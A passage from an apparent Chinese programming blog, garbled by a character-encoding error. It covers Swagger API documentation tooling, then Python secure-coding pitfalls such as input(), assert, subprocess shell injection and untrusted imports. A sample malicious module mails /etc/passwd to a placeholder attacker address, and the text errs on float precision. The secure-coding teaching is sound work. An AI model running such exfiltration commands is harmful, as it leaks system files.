æ­¤æˆ‘ä»¬ä»…éœ€è¦ä½¿ç”¨swagger-editorå’Œswagger-uiå°±å¤Ÿäº†ã€‚ ç¼–è¾‘å™¨(editor)å¯ä»¥ä½¿ç”¨åœ¨çº¿ç¼–è¾‘å™¨ï¼Œè€Œç”±äºç½‘ç»œåŸå› , å¾€å¾€ä¸èƒ½å¾ˆå¥½çš„ä½¿ç”¨swaggeræä¾›çš„åœ¨çº¿ç¼–è¾‘å™¨ï¼Œç„¶è€Œè¿™ä¸ªåœ¨çº¿ç¼–è¾‘å™¨ä¹Ÿå¯ä»¥æœ¬åœ°éƒ¨ç½²ï¼Œå…¶æ¬¡æœ‰å¾ˆå¤šç¼–è¾‘å™¨ä¹Ÿæœ‰swaggerçš„æ’ä»¶, é€šè¿‡æŒ‰ç…§swaggeræ’ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é…ç½®å‡ºä¸€ä¸ªswaggerçš„ç¼–è¾‘å™¨ã€‚æœ‰äº†ç¼–è¾‘å™¨åï¼Œæˆ‘ä»¬éœ€è¦ç†Ÿæ‚‰ä½¿ç”¨swaggeræ¥è®¾è®¡APIçš„ä¸€äº›è¯­æ³•ã€‚ éƒ¨ç½²æœ¬åœ°ç¼–è¾‘å™¨å®‰è£…dockerï¼Œé…ç½®é•œåƒåŠ é€Ÿï¼Œç„¶åæ‹‰å»é•œåƒåˆ°æœ¬åœ°è¿è¡Œ12docker pull swaggerapi/swagger-editordocker run -p 80:8080 swaggerapi/swagger-editor ä½¿ç”¨æœ¬åœ°ç¼–è¾‘å™¨æ¨èä½¿ç”¨vscodeä½œä¸ºç¼–è¾‘å™¨, å®‰è£…vscodeçš„Swagger Viewæ’ä»¶ å°±å¯ä»¥æ‰“é€ ä¸€ä¸ª swaggerçš„ç¼–è¾‘å™¨äº†é‡‡ç”¨yamlç¼–å†™ï¼Œç„¶åä½¿ç”¨Swagger Preview æŸ¥çœ‹é¢„è§ˆã€‚ swagger2.0è¯­æ³•è¯¦æƒ…å‚è€ƒswagger2.0å®˜æ–¹è§„èŒƒ æ ¼å¼é‡‡ç”¨jsonï¼Œ å› ä¸ºyamlæ˜¯jsonçš„ä¸€ä¸ªè¶…é›†ï¼Œå› æ­¤ä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚é€šå¸¸æƒ…å†µæˆ‘ä»¬é€šè¿‡yamlæ¥å®Œæˆç¼–è¾‘ï¼Œæœ€åé€šè¿‡ç¼–è¾‘å™¨å¯¼å‡ºä¸ºjsonæ–‡ä»¶ã€‚ æ–‡ä»¶ç»“æ„ä¸ºä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ï¼Œä½†æ˜¯å…¶ä¸­definitionséƒ¨åˆ†å¯ä»¥è¢«æŠ½å‡ºæ¥ä¸ºä¸€ä¸ªç‹¬ç«‹æ–‡ä»¶ï¼Œé€šè¿‡$refè¿›è¡Œå¼•ç”¨ï¼ŒæŒ‰ç…§æƒ¯ä¾‹ï¼Œè¿™ä¸ªæ–‡ä»¶åº”è¯¥è¢«å‘½åä¸º swagger.json æ•°æ®ç±»å‹ç”¨äºæè¿°ä¸€ä¸ªæ•°æ®çš„æ•°æ®ç±»å‹ï¼Œå¯¹è±¡å®šä¹‰æ—¶ä½¿ç”¨ã€‚ Common Name type format Comments integer integer int32 signed 32 bits long integer int64 signed 64 bits float number float double number double string string byte string byte base64 encoded characters binary string binary any sequence of octets boolean boolean date string date As defined by full-date - RFC3339 dateTime string date-time As defined by date-time - RFC3339 password string password Used to hint UIs the input needs to be obscured. è§„èŒƒè§„èŒƒä¹Ÿå°±æ˜¯è¯­æ³•ï¼Œä¼šå®‰è£…æ­¤è§„èŒƒæ¥ç¼–å†™APIè®¾è®¡æ–‡æ¡£ã€‚ä»¥ä¸‹åˆ—å‡ºäº†æ‰€æœ‰éœ€è¦çš„å…³é”®å­—æ®µ å­—æ®µå ç±»å‹ æè¿° swagger string å¿…å¡«é¡¹ã€‚è¡¨ç¤ºä½¿ç”¨çš„swaggerçš„ç‰ˆæœ¬ï¼Œå¿…é¡»ä¸º2.0 info Info Object å¿…å¡«é¡¹ã€‚æä¾›APIçš„ä¸€äº›å…ƒæ•°æ®æè¿° host string æä¾›è¯¥APIæœåŠ¡çš„ä¸»æœºåç§°æˆ–è€…IPï¼Œæµ‹è¯•æ—¶ ä½¿ç”¨è¯¥åœ°å€è¿›ç¨‹æµ‹è¯•ã€‚ basePath string APIçš„åŸºæœ¬è·¯å¾„,è¿™æ˜¯ç›¸å¯¹çš„hostã€‚ å¦‚æœä¸åŒ…æ‹¬,APIæ˜¯ç›´å±hostã€‚ å¿…é¡»ä»¥â€/â€œå¼€å¤´ schemes [string] APIçš„ä¼ è¾“åè®®çš„åˆ—è¡¨ã€‚ åœ¨â€httpâ€,â€httpsâ€,â€wsâ€,â€wssâ€å…¶ä¸­é€‰æ‹© consumes [string] ä¸€ä¸ªMIMEç±»å‹çš„apiå¯ä»¥ä½¿ç”¨åˆ—è¡¨ã€‚ å€¼å¿…é¡»æ˜¯æ‰€æè¿°çš„Mimeç±»å‹ produces [string] MIMEç±»å‹çš„apiå¯ä»¥äº§ç”Ÿçš„åˆ—è¡¨ã€‚ å€¼å¿…é¡»æ˜¯æ‰€æè¿°çš„Mimeç±»å‹ paths è·¯å¾„å¯¹è±¡ å¿…å¡«é¡¹ã€‚å¯ç”¨çš„è·¯å¾„å’Œæ“ä½œçš„API definitions å®šä¹‰å¯¹è±¡ ä¸€ä¸ªå¯¹è±¡æ•°æ®ç±»å‹å®šä¹‰ parameters å‚æ•°å®šä¹‰å¯¹è±¡ å®šä¹‰è¯·æ±‚å‚æ•°çš„å¯¹è±¡ responses ååº”å®šä¹‰å¯¹è±¡ å®šä¹‰è¯·æ±‚å“åº”å¯¹è±¡ securityDefinitions å®‰å…¨å®šä¹‰å¯¹è±¡ å®‰å…¨æ–¹æ¡ˆå®šä¹‰è§„èŒƒ,æ¯”å¦‚è®¤è¯ security å®‰å…¨éœ€æ±‚å¯¹è±¡ è¿™é‡Œä¸»è¦æŒ‡ä½¿ç”¨å“ªç§è®¤è¯æ‰‹æ®µ tags æ ‡ç­¾å¯¹è±¡ æ²¡ä¸ªRESTfulä¸­èµ„æºçš„æ ‡ç­¾ï¼Œåˆ—è¡¨ä¸­çš„æ¯ä¸ªæ ‡è®°åç§°å¿…é¡»æ˜¯å”¯ä¸€çš„ externalDocs å¤–éƒ¨æ–‡æ¡£å¯¹è±¡ é¢å¤–çš„å¤–éƒ¨æ–‡æ¡£, æŒ‡å‘å¤–éƒ¨url æ¸²æŸ“å™¨(ui)swagger-uiçš„ä½¿ç”¨å¾ˆç®€å•swager-uiå®˜æ–¹æ–‡æ¡£ HTMLæ–‡æ¡£æ¸²æŸ“æ¸²æŸ“å™¨ä½¿ç”¨å®˜æ–¹çš„swagger-uiï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªwebæœåŠ¡å™¨ï¼Œç”¨æ¥æ¸²æŸ“æˆ‘ä»¬åˆšæ‰ç¼–è¾‘å®Œæˆçš„api è®¾è®¡æ–‡æ¡£ã€‚è¿™é‡Œä¸€èˆ¬ä½¿ç”¨node çš„ expressä¸ºwebæ¡†æ¶æ¥åšè¿™ä¸ªç®€å•çš„webæœåŠ¡å™¨ PDFæ–‡æ¡£æ¸²æŸ“å°†APIè®¾è®¡æ–‡æ¡£æ¸²æŸ“æˆPDF, æµç¨‹æ˜¯è¿™æ ·: swagger.yaml â€”&gt; asciiDocâ€”&gt; pdf ä½¿ç”¨swagger2markupæ¥ç”ŸæˆasciiDocæ ¼å¼çš„æ–‡æ¡£ä¸‹è½½swagger2markupå·¥å…·,ä¸‹è½½åœ°å€,é€‰æ‹©ä½ æƒ³è¦çš„ç‰ˆæœ¬ä¸‹è½½ä½¿ç”¨å·¥å…·ç”ŸæˆasciiDoc, -iæŒ‡å®šswagger.yamlçš„ä½ç½®, -fæŒ‡å®šè¾“å‡ºæ–‡ä»¶åç§°ï¼š 1java -jar swagger2markup-cli-1.1.0.jar convert -i ~/PycharmProjects/doc/api_design/swagger.yaml -f asiidoc/swagger ä½¿ç”¨asciidoctoræ¥å°†asciiDocæ¢æ¢æˆPDFè¿™æ˜¯ä¸€ä¸ªrubyå†™çš„å·¥å…·ï¼Œæˆ‘æœ¬åœ°ä¸æ‰“ç®—éƒ¨ç½²rubyç¯å¢ƒï¼Œå› æ­¤åœ¨æ‰¾ä¸€ä¸ªdockeré•œåƒï¼šmadduci/docker-asciidoctor-pdfç”±äºè®¿é—®dockerhubçš„é•œåƒé€Ÿåº¦éå¸¸æ…¢ï¼Œå› æ­¤æˆ‘å°†è¯¥å·¥å…·çš„ä½¿ç”¨è¯´æ˜å¤åˆ¶äº†ä¸‹æ¥ï¼Œé•œåƒä½¿ç”¨è¯´æ˜ Docker Image exposing asciidoctor-pdf as entrypoint and /document as mounted volume where to build the fileTo build your own documents as PDF, simply run the container as:docker run â€“rm -v /path/to/your/document/folder/:/document/ madduci/docker-asciidoctor-pdf /document/your_document.adocIf you want to use some custom styles, just run it asdocker run â€“rm -v /path/to/your/document/folder/:/document/ madduci/docker-asciidoctor-pdf -a pdf-stylesdir=/document/resources/themes -a pdf-style=your_style -a pdf-fontsdir=/document/resources/fonts /document/your_document.adocand it will generate the pdf in the mounted volume /document è¿™å·¥å…·åœ¨ç”Ÿæˆå«æœ‰ä¸­æ–‡çš„pdfæ–‡æ¡£æ—¶æœ‰å­—ä½“é—®é¢˜ï¼Œå› æ­¤æˆ‘ä¿®æ”¹äº†å­—ä½“ä¸ºå¾®è½¯é›…é»‘å­—ä½“ï¼Œä»¥ä¸‹æ˜¯ä¿®æ”¹æ–¹æ³•ï¼š æ·»åŠ é›…é»‘å­—ä½“åˆ°å½“å‰çš„Fontsæ–‡ä»¶å¤¹ä¸‹é¢,è¿™é‡Œéœ€è¦æ ‡å‡†å­—ä½“å’Œç²—ä½“, è€Œé»˜è®¤æä¾›çš„å­—ä½“åªæœ‰è¿™äº›é»˜è®¤æä¾›çš„å­—ä½“ 1234âœ asiidoc ls Fonts |grep -i &apos;yahei&apos;Microsoft Yahei.ttfyahei.ttfyahei_bold.ttf ä¿®æ”¹ä¸»é¢˜é…ç½®default-theme.ymlçš„Noto Serifå­—æ®µï¼Œä½¿ç”¨è¯¥å­—ä½“:é…ç½®æ–‡ä»¶ä¸‹è½½åœ°å€é»˜è®¤é…ç½®æ–‡ä»¶ä¸‹è½½åœ°å€ 12345Noto Serif:normal: yahei.ttfbold: yahei_bold.ttfitalic: yahei.ttfbold_italic: yahei_bold.tt æœ€åæŠŠæˆ‘ä»¬ç”Ÿæˆå¥½çš„swagger.adoc, ä¸»é¢˜é…ç½®æ–‡ä»¶,å­—ä½“ æ”¾åœ¨ä¸€ä¸ªç›®å½•ä¸‹ï¼ŒæŒ‚è½½åˆ°dockeré‡Œé¢å»: 123âœ Downloads ls asiidocFonts swagger.adoc themesdocker run --rm -v $(pwd)/asiidoc/:/document/ madduci/docker-asciidoctor-pdf -a pdf-fontsdir=/document/Fonts -a pdf-stylesdir=/document/themes /document/swagger.adoc æœ€åæŸ¥çœ‹asiidocä¸‹é¢å°±ä¼šæœ‰ç”Ÿæˆçš„pdfæ–‡ä»¶ ä»£ç ç”Ÿæˆå™¨(codegen)swaggerèƒ½æä¾›æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯çš„ä»£ç ç”ŸæˆåŠŸèƒ½,è¿™ä¸ªåŠŸèƒ½åœ¨swagger-editorä¸Šå·²ç»é›†æˆç”Ÿæˆserverç«¯ä»£ç ï¼šç”Ÿæˆå®¢æˆ·ç«¯ä»£ç ï¼š]]></content>
      <categories>
        <category>ç¨‹åºè®¾è®¡</category>
        <category>RESTful API</category>
      </categories>
      <tags>
        <tag>swagger</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨Pythonä¸­çš„ä¸€äº›å®‰å…¨å»ºè®®]]></title>
    <url>%2F2017%2F01%2F02%2Fpython-bestpractice%2F</url>
    <content type="text"><![CDATA[ç”±äºPythonç®€æ´ï¼Œä¼˜é›…ï¼Œå¼€å‘æ•ˆç‡é«˜ï¼Œæ¸æ¸åœ¨è®¡ç®—ç¯å¢ƒä¸­æ— å¤„ä¸åœ¨ã€‚ä½†æ˜¯å¦‚æœä½ ä¸æ³¨æ„ï¼Œå®¹æ˜“ç¼–å†™å‡ºå…·æœ‰ä¸¥é‡å®‰å…¨éšæ‚£çš„ä»£ç , ä»¥ä¸‹æˆ‘æ•´ç†çš„ä¸€äº›å¦‚ä½•ç¼–å†™å‡ºå®‰å…¨ä»£ç çš„ä¸€äº›å»ºè®®ã€‚ inputå‡½æ•°åœ¨Python 2å¤§é‡çš„å†…ç½®åŠŸèƒ½é›†åˆä¸­ï¼Œinputå®Œå…¨å°±æ˜¯ä¸€ä¸ªå®‰å…¨ç¾éš¾ã€‚ä¸€æ—¦è°ƒç”¨å®ƒï¼Œä»æ ‡å‡†è¾“å…¥è¯»å…¥çš„ä»»ä½•ä¸œè¥¿éƒ½ä¼šè¢«ç«‹å³è§£æä¸ºPythonä»£ç ï¼š12345678910âœ ~ python2Python 2.7.12 (default, Dec 2 2016, 21:51:52)[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.42.1)] on darwinType "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; input()dir()['__builtins__', '__doc__', '__name__', '__package__']&gt;&gt;&gt; input()__import__('sys').exit()âœ ~ æ˜¾ç„¶ï¼Œå¿…é¡»æ°¸è¿œä¸ä½¿ç”¨inputå‡½æ•°ï¼Œé™¤éè„šæœ¬çš„æ ‡å‡†è¾“å…¥ä¸­çš„æ•°æ®æ˜¯å®Œå…¨å¯ä¿¡çš„ã€‚ Python 2æ–‡æ¡£å»ºè®®å°†raw_inputä½œä¸ºä¸€ä¸ªå®‰å…¨çš„æ›¿ä»£å“ã€‚åœ¨Python 3ä¸­ï¼Œinputå‡½æ•°ç­‰åŒäºraw_inputï¼Œä»è€Œä¸€åŠ³æ°¸é€¸åœ°è§£å†³äº†è¿™ä¸ªéšæ‚£ assertè¯­å¥åœ¨ Python åº”ç”¨ä¸­ä½¿ç”¨ assert è¯­å¥åœ¨ä¸å¯èƒ½æ¡ä»¶ä¸‹æ•è·æ˜¯ä¸€ä¸ªç¼–ç¨‹ä¹ æƒ¯ã€‚123def verify_credentials(username, password): assert username and password, 'Credentials not supplied by caller' ... authenticate possibly null user with null password ... ç„¶è€Œï¼Œåœ¨å°†æºä»£ç ç¼–è¯‘æˆä¼˜åŒ–çš„å­—èŠ‚ç æ—¶ï¼ˆä¾‹å¦‚ï¼Œ python - O ï¼‰ï¼ŒPython å¹¶ä¸ä¸º assert è¯­å¥ç”Ÿæˆä»»ä½•æŒ‡ä»¤ã€‚å®ƒé»˜é»˜åœ°åˆ é™¤é‚£äº›ç¨‹åºå‘˜å†™çš„è®©ç¨‹åºå…å—ç•¸å½¢æ•°æ®æ”»å‡»çš„ä»£ç ï¼Œè®©åº”ç”¨æš´éœ²åœ¨æ”»å‡»ä¹‹ä¸­ã€‚è¯¥æ¼æ´çš„æ ¹æœ¬åŸå› åœ¨äº assertæœºåˆ¶çº¯ç²¹æ˜¯ä¸ºæµ‹è¯•ç›®çš„è€Œè®¾ï¼Œæ­£å¦‚åœ¨ C++ ä¸­åšçš„é‚£æ ·ã€‚ç¨‹åºå‘˜å¿…é¡»ä½¿ç”¨å…¶ä»–æ‰‹æ®µä»¥ä¿è¯æ•°æ®ä¸€è‡´æ€§ã€‚ ä¸è¦ä½¿ç”¨isæ¥æ¯”è¾ƒintåœ¨æˆ‘ä»¬çš„å°è±¡é‡Œï¼Œintæ˜¯ä¸å¯å˜å¯¹è±¡ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­12345678910&gt;&gt;&gt; a = 257&gt;&gt;&gt; b = 257&gt;&gt;&gt; a is bFalse&gt;&gt;&gt; a == bTrue&gt;&gt;&gt; a = 256&gt;&gt;&gt; b = 256&gt;&gt;&gt; a is bTrue ä¸ºäº†é¿å…æ¯æ¬¡ç»™ç»å¸¸ä½¿ç”¨åˆ°è¿™éƒ¨åˆ†æ•´æ•°åˆ†é…ä¸€ä¸ªæ–°çš„å†…å­˜ï¼ŒPythoné¢„å…ˆç”Ÿæˆå¹¶ç¼“å­˜å¥½è¿™äº›å¸¸ç”¨æ•´æ•°([-5, 257))ï¼Œè¿™æ ·çš„é¢„å¤„ç†å¯ä»¥åŠ å¿«ç¨‹åºè¿è¡Œæ—¶æ•ˆç‡ï¼Œæ›´è¯¦ç»†çš„äº†è§£ä¼šåœ¨ä»¥åçš„Pythonæ•°æ®ç»“æ„æºç è§£è¯»éƒ¨åˆ†åšä»‹ç»ã€‚å› æ­¤ä¸è¦ä½¿ç”¨isæ¯”è¾ƒæ•´æ•°å¤§å°ï¼Œisæ˜¯ç”¨äºæ¯”è¾ƒæ˜¯å¦ä¸ºåŒä¸€å¯¹è±¡çš„ï¼Œisæœ¬èº«æ˜¯ä¸æ˜¯ç”¨æ¥å¹²è¿™ä»¶äº‹çš„ã€‚ floatçš„èˆå…¥é—®é¢˜å› ä¸ºåè¿›åˆ¶çš„å°æ•°å¹¶ä¸èƒ½ç”¨äºŒè¿›åˆ¶ç²¾ç¡®çš„è¡¨è¾¾å‡ºæ¥, åœ¨åè¿›åˆ¶ä¸­ï¼Œè¿›åˆ¶çš„åŸºæ•°æ˜¯10ï¼Œè€Œ5æ­£å¥½æ˜¯10çš„ä¸€åŠã€‚ 2çš„ä¸€åŠæ˜¯å¤šå°‘ï¼Ÿå½“ç„¶æ˜¯1äº†ã€‚ æ‰€ä»¥ï¼Œåè¿›åˆ¶çš„0.5å°±æ˜¯äºŒè¿›åˆ¶çš„0.1, è€Œå¯¹äºäºŒè¿›åˆ¶æ¥è¯´ï¼Œåªæœ‰0å’Œ1çš„å˜åŒ–ï¼Œé‚£ä¹ˆåªæœ‰0.1å’Œ0.0,è¿™æ ·ä»…èƒ½ç²¾ç¡®è¡¨è¾¾åè¿›åˆ¶0.0å’Œ0.5,ä½ ä»¥æ­¤ç±»æ¨ï¼Œé‚£ä¹ˆä¼šå‘ç°ä¸€ä¸ªç»“è®ºï¼šå¦‚æœä¸€ä¸ªåè¿›åˆ¶æ•°å¯ä»¥ç”¨äºŒè¿›åˆ¶ç²¾ç¡®è¡¨ç¤ºï¼Œé‚£ä¹ˆå®ƒçš„æœ€åä¸€ä½è‚¯å®šæ˜¯5,æ‰€ä»¥åªæœ‰ä»¥5ç»“å°¾çš„å°æ•°æ‰èƒ½è¢«ç²¾ç¡®çš„è®¡ç®—æˆ‘ä»¬çœ‹çœ‹ä¸‹é¢ä¸€ä¸ªæœ‰è¶£çš„ç°è±¡ã€‚1234567891011121314151617181920212223242526In [1]: 0.1 + 0.1Out[1]: 0.2In [2]: 0.1 + 0.1 + 0.1Out[2]: 0.30000000000000004In [3]: 0.1 + 0.1 + 0.1 + 0.1Out[3]: 0.4In [4]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[4]: 0.5In [5]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[5]: 0.6In [6]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[6]: 0.7In [7]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[7]: 0.7999999999999999In [8]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[8]: 0.8999999999999999In [9]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[9]: 0.9999999999999999 æˆ‘çœ‹åˆ°æœ‰ä½ç½‘å‹çš„æå‡ºçš„è§£å†³æ–¹æ¡ˆï¼š æˆ‘æœ‰ä¸€ä¸ªè§‚ç‚¹ï¼Œé’ˆå¯¹å°æ•°ç²¾åº¦ä¸å¤Ÿçš„é—®é¢˜ï¼ˆä¾‹å¦‚ 0.1ï¼‰ï¼Œè½¯ä»¶å¯ä»¥äººä¸ºçš„åœ¨æ•°æ®æœ€åä¸€ä½è¡¥ 5ï¼Œ ä¹Ÿå°±æ˜¯ 0.15ï¼Œè¿™æ ·ç‰ºç‰²ä¸€ä½ï¼Œä½†æ˜¯å¯ä»¥ä¿è¯æ•°æ®ç²¾åº¦ï¼Œè¿˜åŸå†æŠŠé‚£ä¸ªå°¾å·´ 5 å»æ‰ã€‚1234567891011In [40]: 0.4 + 0.2Out[40]: 0.6000000000000001In [41]: (0.45 + 0.25) - (0.05 + 0.05)Out[41]: 0.In [49]: 0.6 + 0.3Out[49]: 0.8999999999999999In [50]: 0.65 + 0.35 - (0.05 + 0.05)Out[50]: 0.9 æœ€å¥½çš„å¤„ç†æªæ–½æ˜¯åªè¦æœ‰å¯èƒ½ï¼Œå°±åšæŒæ•´æ•°è¿ç®—ã€‚æ¬¡å¥½çš„å¤„ç†æªæ–½å¯èƒ½æ˜¯ä½¿ç”¨decimalæ¨¡å—ï¼Œå®ƒè¯•å›¾ä¿æŠ¤ç”¨æˆ·å…å—çç¢ç»†èŠ‚å’Œå±é™©ç¼ºé™·ä¹‹è‹¦ã€‚ ç§æœ‰å±æ€§Python ä¸æ”¯æŒå¯¹è±¡å±æ€§éšè—, åŠæ—¶ä½ ä½¿ç”¨__æ¥ä¿æŠ¤ä½ çš„å˜é‡(private),åœ¨å†…éƒ¨ï¼Œpythonä¹Ÿä»…ä»…æ˜¯å°†å…¶åˆ«åäº†è€Œå·²ï¼Œè€Œè¿™ä¸ªåˆ«åçš„åŠ¨ä½œæ˜¯åœ¨è§£é‡Šå™¨è°ƒç”¨typeæ¥åˆ›å»ºclassæ—¶æ‰§è¡Œçš„çš„ã€‚123456789101112131415161718192021222324252627In [54]: class X(object): ...: def __init__(self): ...: self.__private = 1 ...: def get_private(self): ...: return self.__private ...: def has_private(self): ...: return hasattr(self, '__private') ...:In [55]: x = X()In [56]: x.has_private()Out[56]: FalseIn [57]: x.get_private()Out[57]: 1In [58]: x.__private = 2In [59]: x.__privateOut[59]: 2In [60]: hasattr(x, '__private')Out[60]: TrueIn [61]: x._X__privateOut[61]: 1 ç„¶åå¦‚æœæˆ‘ä»¬åé¢åŠ¨æ€æ·»åŠ çš„å±æ€§ï¼Œé‚£ä¹ˆæ˜¯ä¸ä¼šæœ‰è¿™ç§ä¿æŠ¤çš„(æ— è½¬æ¢å‘ç”Ÿ)12345In [62]: x.__privateOut[62]: 2In [63]: hasattr(x, '__private')Out[63]: True å¦‚æœç¨‹åºå‘˜ä¾èµ–äºåŒä¸‹åˆ’çº¿å±æ€§æ¥åœ¨ä»–ä»¬çš„ä»£ç ä¸­åšå‡ºé‡è¦å†³å®šï¼Œè€Œä¸å…³æ³¨ç§æœ‰å±æ€§çš„ä¸å¯¹ç§°è¡Œä¸ºï¼Œé‚£ä¹ˆè¿™äº›å°æŠ€å·§ä¼šå˜æˆå®‰å…¨æ¼æ´ æ¨¡å—æ‰§è¡Œè¯­å¥å®é™…ä¸Šä¼šå¯¼è‡´å¯¼å…¥çš„æ¨¡å—ä¸­çš„ä»£ç çš„æ‰§è¡Œï¼Œè¿™ä¸€äº‹å®å¹¶ä¸æ˜æ˜¾ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆç”šè‡³å¯¼å…¥ä¸å¯ä¿¡æ¨¡å—æˆ–åŒ…æ˜¯æœ‰é£é™©çš„ã€‚å¯¼å…¥åƒè¿™æ ·çš„ç®€å•æ¨¡å—å¯èƒ½ä¼šå¯¼è‡´ä¸æ„‰å¿«çš„ç»“æœï¼š1234567891011$ cat malicious.pyimport osimport sysos.system('cat /etc/passwd | mail attacker@blackhat.com')del sys.modules['malicious'] # pretend it's not imported$ python&gt;&gt;&gt; import malicious&gt;&gt;&gt; dir(malicious)Traceback(most recent call last):NameError: name 'malicious' is not defined çŒ´å­è¡¥ä¸è¿è¡Œæ—¶ä¿®æ”¹ Python å¯¹è±¡å±æ€§çš„è¿‡ç¨‹ç§°ä¹‹ä¸ºçŒ´å­è¡¥ä¸ ( monkey patching)ã€‚ä½œä¸ºåŠ¨æ€è¯­è¨€ï¼Œ Python å®Œå…¨æ”¯æŒè¿è¡Œæ—¶ç¨‹åºè‡ªçœå’Œä»£ç çªå˜ã€‚ä¸€æ—¦ä»¥æŸç§æ–¹å¼å¯¼å…¥äº†ä¸€ä¸ªæ¶æ„æ¨¡å—ï¼Œé‚£ä¹ˆä»»ä½•ç°æœ‰çš„å¯å˜å¯¹è±¡å¯è¢«ä¸çŸ¥ä¸è§‰åœ°åœ¨æ²¡æœ‰ç¨‹åºå‘˜åŒæ„çš„æƒ…å†µä¸‹è¢«æ‰“çŒ´å­è¡¥ä¸ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ Python åƒåœ¾å›æ”¶å™¨ ( gc.get_objects())æ¥æŒæ¡ç°æœ‰çš„æ‰€æœ‰å¯¹è±¡ï¼Œå¹¶é»‘è¿›å®ƒä»¬ä¸­ä»»æ„ä¸€ä¸ªã€‚ Python å¯¹è±¡çš„ç±»å‹æ˜¯ç”± __class__ å±æ€§å†³å®šçš„ã€‚é‚ªæ¶çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¾é æ”¹å˜æ´»åŠ¨å¯¹è±¡çš„ç±»å‹æ¥ä»¤äººç»æœ›åœ°æŠŠäº‹æƒ…æç ¸ï¼š12345678910111213141516171819&gt;&gt;&gt; class X(object): pass...&gt;&gt;&gt; class Y(object): pass...&gt;&gt;&gt; x_obj = X()&gt;&gt;&gt; x_obj&lt;__main__.X object at 0x7f62dbe5e010 &gt;&gt;&gt;&gt; isinstance(x_obj, X)True&gt;&gt;&gt; x_obj.__class__ = Y&gt;&gt;&gt; x_obj&lt;__main__.Y object at 0x7f62dbe5d350 &gt;&gt;&gt;&gt; isinstance(x_obj, X)False&gt;&gt;&gt; isinstance(x_obj, Y)True&gt;&gt;&gt; å¯¹æŠ—æ¶æ„çŒ´å­è¡¥ä¸çš„å”¯ä¸€å¤„ç†æªæ–½æ˜¯ä¿è¯å¯¼å…¥çš„ Python æ¨¡å—çš„çœŸå®æ€§å’Œå®Œæ•´æ€§, ä¸€ä¸ªç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨__slot__æ¥ä¿æŠ¤è‡ªå·±çš„ç±»ä¸è¢«æ³¨å…¥æ”»å‡»,ä½†æ˜¯è¿™åˆä¸§å¤±äº†ä¸€äº›çµæ´»æ€§ã€‚ é€šè¿‡subprocessè¿›è¡Œshellæ³¨å…¥ä»¥èƒ¶æ°´è¯­è¨€è‘—ç§°ï¼Œå¯¹Pythonè„šæœ¬æ¥è¯´ï¼Œé€šè¿‡è®©æ“ä½œç³»ç»Ÿæ¥æ‰§è¡Œå®ƒä»¬ï¼Œå¯èƒ½è¿˜æä¾›é¢å¤–çš„å‚æ•°ï¼Œæ¥å§”æ´¾ç³»ç»Ÿç®¡ç†ä»»åŠ¡ç»™å…¶ä»–ç¨‹åºï¼Œæ˜¯éå¸¸å¸¸è§çš„ã€‚subprocessæ¨¡å—ä¸ºè¿™æ ·çš„ä»»åŠ¡æä¾›äº†æ˜“äºä½¿ç”¨å’Œç›¸å½“é«˜å±‚æ¬¡çš„æœåŠ¡ã€‚12345&gt;&gt;&gt; from subprocess import call&gt;&gt;&gt; call('date')2017å¹´ 1æœˆ10æ—¥ æ˜ŸæœŸäºŒ 13æ—¶11åˆ†53ç§’ CST0&gt;&gt;&gt; ä½†æœ‰ä¸€ä¸ªé™·é˜±ï¼è¦åˆ©ç”¨UNIX shellæœåŠ¡ï¼Œä¾‹å¦‚å‘½ä»¤è¡Œå‚æ•°æ‰©å±•ï¼Œcallå‡½æ•°çš„shellå…³é”®å­—å‚æ•°åº”è¯¥è®¾ç½®ä¸ºTrueã€‚ç„¶ååŸæ ·ä¼ é€’callå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ç»™ç³»ç»Ÿshellï¼Œç”¨ä»¥è¿›ä¸€æ­¥çš„è§£æã€‚ä¸€æ—¦æ— æ•ˆçš„ç”¨æˆ·è¾“å…¥åˆ°è¾¾callå‡½æ•°(æˆ–è€…å…¶ä»–åœ¨ subprocess æ¨¡å—ä¸­å®ç°çš„å‡½æ•°)ï¼Œé‚£ä¹ˆå°±ä¼šå¼€æ”¾ä¸€ä¸ªå£ç»™åº•å±‚ç³»ç»Ÿèµ„æºã€‚12345&gt;&gt;&gt; call('cut -d: -f1 /etc/passwd', shell=True)nobodyrootdaemon... æ˜¾ç„¶ï¼Œå°†shellå…³é”®å­—ä¿æŒé»˜è®¤å€¼Falseï¼Œå¹¶ä¸”æä¾›å‘½ä»¤åŠå…¶å‚æ•°çš„æ•°ç»„ç»™subprocesså‡½æ•°ï¼Œä¸è¦ä¸ºå¤–éƒ¨å‘½ä»¤æ‰§è¡Œè°ƒç”¨UNIX shellï¼Œè¿™æ ·ä¼šå®‰å…¨å¾—å¤šã€‚åœ¨è¿™ç¬¬äºŒæ¬¡è°ƒç”¨æ ¼å¼ï¼Œå‘½ä»¤æˆ–è€…å®ƒçš„å‚æ•°éƒ½ä¸ä¼šè¢«shellè§£ææˆ–å±•å¼€ã€‚å¦‚æœåº”ç”¨çš„æœ¬è´¨å†³å®šäº†ä½¿ç”¨UNIX shellæœåŠ¡ï¼Œé‚£ä¹ˆæ¸…ç†ä¸€åˆ‡åˆ° 